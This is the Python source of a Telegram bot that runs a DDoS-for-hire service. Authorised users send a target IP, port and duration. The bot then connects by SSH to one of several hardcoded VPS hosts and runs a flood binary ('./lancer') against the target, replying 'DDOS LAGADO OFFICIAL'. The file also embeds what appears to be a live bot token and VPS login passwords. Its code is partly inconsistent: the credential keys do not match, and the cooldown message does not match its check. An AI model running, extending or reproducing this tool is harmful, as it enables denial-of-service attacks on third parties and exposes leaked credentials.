#soulddoserpython

import telebot
import subprocess
import datetime
import os
import random
import paramiko
import socket

# Insert your Telegram bot token here
bot = telebot.TeleBot('8013938312:AAH2wgu1Gsw29Lo5orDamDs3crFmJlHZYGE')

# Admin user IDs
admin_id = {"6321758394", "1257888659"}
USER_FILE = "users1.txt"
LOG_FILE = "log1.txt"

# VPS credentials
vps_list = [
    {"ip": "155.138.136.219", "username": "master_ngmatkuyvr", "password": "98Cf7KqktBBs"},
    {"ip": "70.34.255.101", "username": "master_fptcarnpqt", "password": "jFtHtZf6swW4"},
    {"ip": "70.34.255.232", "username": "master_kvrbezzhav", "password": "seCR2Wn4YYhK"}
]

def is_vps_alive(ip, port=22, timeout=2):
    try:
        socket.create_connection((ip, port), timeout=timeout)
        return True
    except:
        return False

def get_alive_vps():
    return [vps for vps in vps_list if is_vps_alive(vps['ip'])]

def execute_on_vps(command):
    alive_vps = get_alive_vps()
    if not alive_vps:
        return "No VPS available to execute the command."
    vps = random.choice(alive_vps)
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'])
        stdin, stdout, stderr = ssh.exec_command(command)
        result = stdout.read().decode()
        ssh.close()
        return f"Command executed on VPS {vps['ip']}\n{result}"
    except Exception as e:
        return f"Error executing on {vps['ip']}: {str(e)}"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, king, soulking, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nking: {king}\nsoulking: {soulking}\nTime: {time}\n\n")

def record_command_logs(user_id, command, king=None, soulking=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if king:
        log_entry += f" | king: {king}"
    if soulking:
        log_entry += f" | soulking: {soulking}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                return "Logs cleared successfully ✅"
    except FileNotFoundError:
        return "No logs found to clear."

def start_attack_reply(message, king, soulking, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: soul\n\n🌟 DDOS LAGADO OFFICIAL..!💀"
    bot.reply_to(message, response)

soul_cooldown = {}
COOLDOWN_TIME = 0

@bot.message_handler(commands=['soul'])
def handle_soul(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 3:
                bot.reply_to(message, "You Are On Cooldown. Please Wait 5min Before Running The /soul Command Again.")
                return
            soul_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            king = command[1]
            soulking = int(command[2])
            time = int(command[3])
            if time > 181:
                response = "Error: Time interval must be less than 181."
            else:
                record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                log_command(user_id, king, soulking, time)
                start_attack_reply(message, king, soulking, time)
                full_command = f"./lancer {king} {soulking} {time}"
                response = execute_on_vps(full_command)
        else:
            response = "✅ Usage: /soul <king> <soulking> <time>"
    else:
        response = "ミ🥹★ Access Denied ★🥹彡DM - @SOULCRACK ."
    bot.reply_to(message, response)

@bot.message_handler(commands=['vps_status'])
def check_vps_status(message):
    statuses = []
    for vps in vps_list:
        status = "Online" if is_vps_alive(vps['ip']) else "Offline"
        statuses.append(f"VPS {vps['ip']}: {status}")
    bot.reply_to(message, "\n".join(statuses))

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n" + "\n".join(user_ids)
                else:
                    response = "No users found."
        except FileNotFoundError:
            response = "No user file found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No logs found.")
        else:
            bot.reply_to(message, "Log file is empty or missing.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No logs found for you."
        except FileNotFoundError:
            response = "Log file not found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    bot.reply_to(message, f"🤖Your ID: {user_id}")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
